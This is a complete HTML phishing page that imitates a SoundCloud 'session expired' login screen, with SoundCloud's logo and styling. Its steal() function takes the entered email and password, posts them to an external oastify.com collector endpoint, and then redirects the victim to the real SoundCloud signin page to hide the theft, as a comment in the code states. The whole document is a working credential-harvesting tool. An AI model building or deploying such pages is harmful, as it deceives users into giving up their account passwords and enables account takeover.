<!DOCTYPE html>
<html>
<head>
    <title>SoundCloud - Login Required</title>
    <style>
        body { background: #f2f2f2; font-family: "Interstate","Lucida Grande",Arial,sans-serif; }
        .login-box { background: white; width: 400px; margin: 100px auto; padding: 40px; border: 1px solid #ccc; text-align: center; }
        .btn { background: #ff5500; color: white; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-weight: bold; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://a-v2.sndcdn.com/assets/images/peace-cloud-28ad10.svg" width="50"><br>
        <h3>Your session has expired.</h3>
        <p>Please log in to continue listening.</p>
        <input type="text" id="user" placeholder="Email or Profile URL">
        <input type="password" id="pass" placeholder="Your Password">
        <button class="btn" onclick="steal()">Sign In</button>
    </div>

    <script>
        function steal() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/creds', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ email: u, password: p, origin: "gate.sc_bypass" })
            });

            // After stealing, send them back to the real SoundCloud login
            window.location.href = "https://soundcloud.com/signin";
        }
    </script>
</body>
</html>
